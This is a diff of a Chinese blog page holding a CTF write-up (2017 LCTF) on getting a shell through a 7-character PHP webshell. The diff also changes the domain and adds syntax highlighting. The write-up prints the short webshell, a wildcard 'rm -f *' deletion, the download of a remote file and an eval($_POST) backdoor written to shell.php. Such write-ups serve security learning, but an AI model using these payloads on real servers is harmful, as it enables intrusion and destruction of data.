@@ -71,21 +71,21 @@
 
 
 
-<meta name="description" content="2017-LCTF-“他们”有什么秘密呢?到第二关，可以在沙箱里创建任意名字的文件, webshell被限制在7个字符里, 很容易找到1&amp;lt;?=`*` 这样的webshell, 然后通过执行本地文件名字的命令拿到shell，但是默认有index.html 两种方法：1.默认有index.html 使用bash命令查看目录，查看flag123456789创建 bash1创建 bbls /创建z.">
+<meta name="description" content="2017-LCTF-“他们”有什么秘密呢?到第二关，可以在沙箱里创建任意名字的文件, webshell被限制在7个字符里, 很容易找到 &amp;lt;?=`*`  这样的webshell, 然后通过执行本地文件名字的命令拿到shell，但是默认有index.html 两种方法：1.默认有index.html 使用bash命令查看目录，查看flag 创建 bash 1  创建 bb ls /  创建z.p">
 <meta name="keywords" content="summary">
 <meta property="og:type" content="article">
 <meta property="og:title" content="随手笔记">
-<meta property="og:url" content="http://www.cuittk.cn/2018/11/10/随手笔记/index.html">
+<meta property="og:url" content="https://blog.cuittk.cn/2018/11/10/随手笔记/index.html">
 <meta property="og:site_name" content="h1tler&#39;s blog">
-<meta property="og:description" content="2017-LCTF-“他们”有什么秘密呢?到第二关，可以在沙箱里创建任意名字的文件, webshell被限制在7个字符里, 很容易找到1&amp;lt;?=`*` 这样的webshell, 然后通过执行本地文件名字的命令拿到shell，但是默认有index.html 两种方法：1.默认有index.html 使用bash命令查看目录，查看flag123456789创建 bash1创建 bbls /创建z.">
+<meta property="og:description" content="2017-LCTF-“他们”有什么秘密呢?到第二关，可以在沙箱里创建任意名字的文件, webshell被限制在7个字符里, 很容易找到 &amp;lt;?=`*`  这样的webshell, 然后通过执行本地文件名字的命令拿到shell，但是默认有index.html 两种方法：1.默认有index.html 使用bash命令查看目录，查看flag 创建 bash 1  创建 bb ls /  创建z.p">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://img.cdn.cuittk.cn/5jd27hm6wm6lxnjjbvfjnwvkro.png">
 <meta property="og:image" content="http://img.cdn.cuittk.cn/ynb09cmgupiudkhskyoiba3ot7.png">
 <meta property="og:image" content="http://img.cdn.cuittk.cn/ahhoe46cbcxo5kizhh0xyr8xs9.png">
-<meta property="og:updated_time" content="2018-11-10T09:12:33.898Z">
+<meta property="og:updated_time" content="2020-02-26T10:41:55.359Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="随手笔记">
-<meta name="twitter:description" content="2017-LCTF-“他们”有什么秘密呢?到第二关，可以在沙箱里创建任意名字的文件, webshell被限制在7个字符里, 很容易找到1&amp;lt;?=`*` 这样的webshell, 然后通过执行本地文件名字的命令拿到shell，但是默认有index.html 两种方法：1.默认有index.html 使用bash命令查看目录，查看flag123456789创建 bash1创建 bbls /创建z.">
+<meta name="twitter:description" content="2017-LCTF-“他们”有什么秘密呢?到第二关，可以在沙箱里创建任意名字的文件, webshell被限制在7个字符里, 很容易找到 &amp;lt;?=`*`  这样的webshell, 然后通过执行本地文件名字的命令拿到shell，但是默认有index.html 两种方法：1.默认有index.html 使用bash命令查看目录，查看flag 创建 bash 1  创建 bb ls /  创建z.p">
 <meta name="twitter:image" content="http://img.cdn.cuittk.cn/5jd27hm6wm6lxnjjbvfjnwvkro.png">
 
 
@@ -116,12 +116,12 @@
 
 
 
-  <link rel="canonical" href="http://www.cuittk.cn/2018/11/10/随手笔记/"/>
+  <link rel="canonical" href="https://blog.cuittk.cn/2018/11/10/随手笔记/"/>
 
 
 
 
-
+<link rel="stylesheet" href="/js/prism/prism.css">
   <title>随手笔记 | h1tler's blog</title>
   
 
@@ -259,7 +259,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.cuittk.cn/2018/11/10/随手笔记/">
+    <link itemprop="mainEntityOfPage" href="https://blog.cuittk.cn/2018/11/10/随手笔记/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="h1tler">
@@ -331,11 +331,44 @@
       
 
       
-        <h3 id="2017-LCTF-“他们”有什么秘密呢"><a href="#2017-LCTF-“他们”有什么秘密呢" class="headerlink" title="2017-LCTF-“他们”有什么秘密呢?"></a>2017-LCTF-“他们”有什么秘密呢?</h3><p>到第二关，可以在沙箱里创建任意名字的文件, webshell被限制在7个字符里, 很容易找到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?=`*`</div></pre></td></tr></table></figure></p>
+        <h3 id="2017-LCTF-“他们”有什么秘密呢"><a href="#2017-LCTF-“他们”有什么秘密呢" class="headerlink" title="2017-LCTF-“他们”有什么秘密呢?"></a>2017-LCTF-“他们”有什么秘密呢?</h3><p>到第二关，可以在沙箱里创建任意名字的文件, webshell被限制在7个字符里, 很容易找到</p>
+<pre><code class="language-php">&lt;?=`*`
+</code></pre>
 <p>这样的webshell, 然后通过执行本地文件名字的命令拿到shell，但是默认有index.html</p>
-<p>两种方法：<br>1.默认有index.html 使用bash命令查看目录，查看flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">创建 bash</div><div class="line">1</div><div class="line"></div><div class="line">创建 bb</div><div class="line">ls /</div><div class="line"></div><div class="line">创建z.php</div><div class="line">&lt;?=`*`;</div><div class="line">&gt;访问 z.php</div></pre></td></tr></table></figure></p>
+<p>两种方法：<br>1.默认有index.html 使用bash命令查看目录，查看flag</p>
+<pre><code class="language-html">创建 bash
+1
+
+创建 bb
+ls /
+
+创建z.php
+&lt;?=`*`;
+&gt;访问 z.php
+</code></pre>
 <p><img src="http://img.cdn.cuittk.cn/5jd27hm6wm6lxnjjbvfjnwvkro.png" alt=""><br>将bb 内容改为 cat /3* ,再访问z.php<br><img src="http://img.cdn.cuittk.cn/ynb09cmgupiudkhskyoiba3ot7.png" alt=""></p>
-<p>2.删除index.html  webshell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">创建 z.php</div><div class="line">&lt;?=`*`;</div><div class="line"></div><div class="line">创建 b</div><div class="line">rm -f *</div><div class="line"></div><div class="line">创建 bash</div><div class="line">1</div><div class="line">&gt;访问z.php //实现删除文件</div><div class="line"></div><div class="line">创建 z.php</div><div class="line">&lt;?=`*`;</div><div class="line"></div><div class="line">创建 www1.cuittk.cn //index.html内容为: echo &quot;&lt;?php eval(\$_POST[h]);?&gt;&quot;&gt;shell.php</div><div class="line">1</div><div class="line">&gt;访问 z.php //下载了index.html</div><div class="line"></div><div class="line">创建bash</div><div class="line">1</div><div class="line">&gt;访问z.php,执行bash脚本生成shell.php</div></pre></td></tr></table></figure></p>
+<p>2.删除index.html  webshell</p>
+<pre><code class="language-html">创建 z.php
+&lt;?=`*`;
+
+创建 b
+rm -f *
+
+创建 bash
+1
+&gt;访问z.php //实现删除文件
+
+创建 z.php
+&lt;?=`*`;
+
+创建 www1.cuittk.cn //index.html内容为: echo &quot;&lt;?php eval(\$_POST[h]);?&gt;&quot;&gt;shell.php
+1
+&gt;访问 z.php //下载了index.html
+
+创建bash
+1
+&gt;访问z.php,执行bash脚本生成shell.php
+</code></pre>
 <p><img src="http://img.cdn.cuittk.cn/ahhoe46cbcxo5kizhh0xyr8xs9.png" alt=""></p>
 
       
@@ -461,7 +494,7 @@
             
               <a href="/archives/">
             
-                <span class="site-state-item-count">57</span>
+                <span class="site-state-item-count">58</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -589,7 +622,7 @@
 
 
 <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
+<script src="/js/prism/prism.js" async></script>
         
 <div class="busuanzi-count">
   <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
